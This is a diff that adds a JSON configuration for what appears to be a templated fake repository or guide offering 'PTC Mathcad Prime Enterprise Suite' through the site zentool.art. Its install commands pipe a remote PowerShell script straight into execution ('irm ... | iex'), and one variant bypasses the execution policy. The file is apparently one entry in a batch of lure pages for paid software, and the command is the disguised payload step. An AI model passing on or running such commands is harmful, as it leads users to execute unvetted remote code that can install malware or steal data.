@@ -1,0 +1,28 @@
+{
+  "repo": "PTC-Mathcad-Prime-Enterprise-Suite",
+  "product": "PTC Mathcad Prime Enterprise Suite",
+  "product_title": "PTC Mathcad Prime Enterprise",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "ptc-mathcad-prime-enterprise-windows",
+    "ptc-config",
+    "ptc-integration",
+    "ptc-latest",
+    "system-tools",
+    "windows-utility",
+    "desktop-tools",
+    "maintenance",
+    "configuration",
+    "performance-tuning",
+    "disk-cleanup",
+    "uninstaller"
+  ],
+  "site": "zentool.art"
+}
